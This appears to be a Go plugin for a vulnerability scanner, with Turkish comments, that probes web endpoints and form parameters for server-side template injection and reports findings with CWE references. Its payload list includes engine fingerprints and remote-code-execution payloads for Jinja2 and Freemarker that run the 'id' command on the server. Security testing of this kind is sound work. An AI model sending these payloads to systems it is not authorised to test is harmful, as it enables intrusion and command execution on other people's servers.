package plugins

import (
	"DORM/models"
	"fmt"
	"io"
	"net/url"
	"strings"
)

// ==================================================
// SSTI — v3.0 "Template Terminator"
// 15+ payload · Framework Fingerprint
// RCE Escalation · POST Fuzzing · Error Detection
// ==================================================
type SSTIPlugin struct{}

func (p *SSTIPlugin) Name() string { return "SSTI (Template Terminator v3)" }

func (p *SSTIPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	// ── Engine-spesifik kanaryalar ────────────────────────────────────────
	type SSTIProbe struct {
		Payload  string
		Expected string // response'da aranacak
		Engine   string
		IsRCE    bool
	}

	probes := []SSTIProbe{
		// ── Math canary (1337 * 1337 = 1787569) — tüm engine'lerde çalışır ─
		{"{{1337*1337}}", "1787569", "Jinja2/Nunjucks/Twig (math)", false},
		{"${1337*1337}", "1787569", "Freemarker/Groovy (math)", false},
		{"#{1337*1337}", "1787569", "Spring EL / Pebble (math)", false},
		{"<%= 1337*1337 %>", "1787569", "Ruby ERB / Mako (math)", false},
		{"#set($x=1337*1337)${x}", "1787569", "Velocity (math)", false},

		// ── Jinja2-spesifik (7*'7' = '7777777') ─────────────────────────
		{"{{7*'7'}}", "7777777", "Jinja2 (string-repeat fingerprint)", false},

		// ── Twig-spesifik ────────────────────────────────────────────────
		{"{{7*7}}", "49", "Twig/Jinja2 (generic)", false},
		{"{7*7}", "49", "Smarty (curly-only)", false},

		// ── Smarty-spesifik ──────────────────────────────────────────────
		{"{$smarty.version}", "Smarty", "Smarty (version disclosure)", false},
		{"{math equation=\"x*y\" x=7 y=7}", "49", "Smarty (math function)", false},

		// ── Freemarker-spesifik ──────────────────────────────────────────
		{"${\"freemarker\".toUpperCase()}", "FREEMARKER", "Freemarker (string method)", false},
		{"[#assign x=7*7]${x}", "49", "Freemarker (assign directive)", false},

		// ── Mako (Python) ────────────────────────────────────────────────
		{"${7*7}", "49", "Mako/Python (dollar-brace)", false},

		// ── Universal polyglot ───────────────────────────────────────────
		{"{{7*7}}${7*7}#{7*7}<%= 7*7 %>${{7*7}}", "49", "Polyglot (universal)", false},

		// ── Jinja2 RCE Escalation ────────────────────────────────────────
		{
			"{{''.__class__.__mro__[1].__subclasses__()}}",
			"<class",
			"Jinja2 (Python object chain — RCE escalation)",
			true,
		},
		{
			"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
			"uid=",
			"Jinja2 RCE (os.popen('id'))",
			true,
		},

		// ── Freemarker RCE ───────────────────────────────────────────────
		{
			`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`,
			"uid=",
			"Freemarker RCE (Execute class)",
			true,
		},
	}

	// ── Hata imzaları (error-based detection) ────────────────────────────
	errorSigs := []string{
		"TemplateSyntaxError", "TemplateNotFound", "UndefinedError",
		"Unclosed comment", "ParseError", "TemplateSyntaxException",
		"freemarker.core", "org.springframework.expression",
		"javax.el.ELException", "SmartTemplateException",
	}

	endpoints := []string{"/", "/index.php", "/home", "/search", "/error", "/render", "/template", "/page"}
	params := []string{"q", "s", "search", "name", "username", "id", "template", "msg", "page", "text", "content"}

	fingerprint := func(body string) string {
		for _, probe := range probes {
			if probe.Engine != "" && strings.Contains(body, probe.Expected) {
				return probe.Engine
			}
		}
		return "Unknown Engine"
	}

	// ══════════════════════════════════════════════════════════════════════
	// FAZA 1 — GET Parameter Fuzzing
	// ══════════════════════════════════════════════════════════════════════
	for _, ep := range endpoints {
		for _, param := range params {
			for _, probe := range probes {
				targetURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, url.QueryEscape(probe.Payload))

				resp, err := client.Get(targetURL)
				if err != nil {
					continue
				}
				bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
				resp.Body.Close()
				body := string(bodyBytes)

				// Math/fingerprint canary eşleşmesi
				if strings.Contains(body, probe.Expected) && !strings.Contains(body, probe.Payload) {
					sev := "CRITICAL"
					cvss := 9.9
					name := "Server Side Template Injection (SSTI)"

					if probe.IsRCE && strings.Contains(body, "uid=") {
						name = fmt.Sprintf("SSTI RCE Confirmed (%s)", probe.Engine)
						cvss = 10.0
					} else {
						name = fmt.Sprintf("SSTI Detected — Engine: %s", probe.Engine)
					}

					return &models.Vulnerability{
						Target:   target,
						Name:     name,
						Severity: sev,
						CVSS:     cvss,
						Description: fmt.Sprintf(
							"Template engine, enjekte edilen kodu yürüttü.\nEndpoint: %s\nParam: %s\nPayload: %s\nBeklenen Çıktı: %s\nEngine Fingerprint: %s",
							targetURL, param, probe.Payload, probe.Expected, probe.Engine,
						),
						Solution:  "Kullanıcı girdilerini template engine'e geçirmeden önce sterilize edin. Sandbox modunu aktif hale getirin.",
						Reference: "OWASP SSTI / CWE-94: Code Injection",
					}
				}

				// Error-based detection
				for _, errSig := range errorSigs {
					if strings.Contains(body, errSig) {
						engine := fingerprint(body)
						return &models.Vulnerability{
							Target:   target,
							Name:     "SSTI (Template Syntax Error Leak)",
							Severity: "HIGH",
							CVSS:     8.0,
							Description: fmt.Sprintf(
								"Template engine parse hatası sızdı — SSTI yüzey alanı doğrulandı.\nEndpoint: %s\nParam: %s\nPayload: %s\nHata: %s\nEngine: %s",
								targetURL, param, probe.Payload, errSig, engine,
							),
							Solution:  "Template hata mesajlarını production'da kullanıcıya göstermeyin.",
							Reference: "OWASP SSTI / CWE-209: Error Message Information Exposure",
						}
					}
				}
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════════
	// FAZA 2 — Spider GET Endpoint Entegrasyonu
	// ══════════════════════════════════════════════════════════════════════
	key := "endpoints_" + target.IP
	if existing, ok := models.SharedData.Load(key); ok {
		spiderEndpoints := existing.([]models.Endpoint)
		for _, ep := range spiderEndpoints {
			if ep.Method == "GET" && len(ep.Params) > 0 {
				for _, param := range ep.Params {
					for _, probe := range probes[:8] { // İlk 8 probe (RCE'siz)
						parsedURL, err := url.Parse(ep.URL)
						if err != nil {
							continue
						}
						q := parsedURL.Query()
						q.Set(param, probe.Payload)
						parsedURL.RawQuery = q.Encode()

						resp, err := client.Get(parsedURL.String())
						if err != nil {
							continue
						}
						bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
						resp.Body.Close()
						body := string(bodyBytes)

						if strings.Contains(body, probe.Expected) && !strings.Contains(body, probe.Payload) {
							return &models.Vulnerability{
								Target:   target,
								Name:     fmt.Sprintf("SSTI (Spider-Discovered — %s)", probe.Engine),
								Severity: "CRITICAL",
								CVSS:     9.9,
								Description: fmt.Sprintf(
									"Spider'ın keşfettiği endpoint'te template injection doğrulandı.\nURL: %s\nParam: %s\nPayload: %s\nEngine: %s",
									parsedURL.String(), param, probe.Payload, probe.Engine,
								),
								Solution:  "Kullanıcı girdilerini template engine'e geçirmeden önce sterilize edin.",
								Reference: "OWASP SSTI / CWE-94",
							}
						}
					}
				}
			}

			// ── POST Parameter Fuzzing ────────────────────────────────────
			if ep.Method == "POST" && len(ep.Params) > 0 {
				for _, param := range ep.Params {
					for _, probe := range probes[:6] {
						formData := url.Values{}
						formData.Set(param, probe.Payload)

						resp, err := client.PostForm(ep.URL, formData)
						if err != nil {
							continue
						}
						bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
						resp.Body.Close()
						body := string(bodyBytes)

						if strings.Contains(body, probe.Expected) && !strings.Contains(body, probe.Payload) {
							return &models.Vulnerability{
								Target:   target,
								Name:     fmt.Sprintf("SSTI (POST Spider-Discovered — %s)", probe.Engine),
								Severity: "CRITICAL",
								CVSS:     9.9,
								Description: fmt.Sprintf(
									"POST parametresi üzerinden template injection doğrulandı.\nURL: %s\nParam: %s\nPayload: %s\nEngine: %s",
									ep.URL, param, probe.Payload, probe.Engine,
								),
								Solution:  "POST girdileri de dahil olmak üzere tüm kullanıcı verilerini sterilize edin.",
								Reference: "OWASP SSTI / CWE-94",
							}
						}
					}
				}
			}
		}
	}

	return nil
}
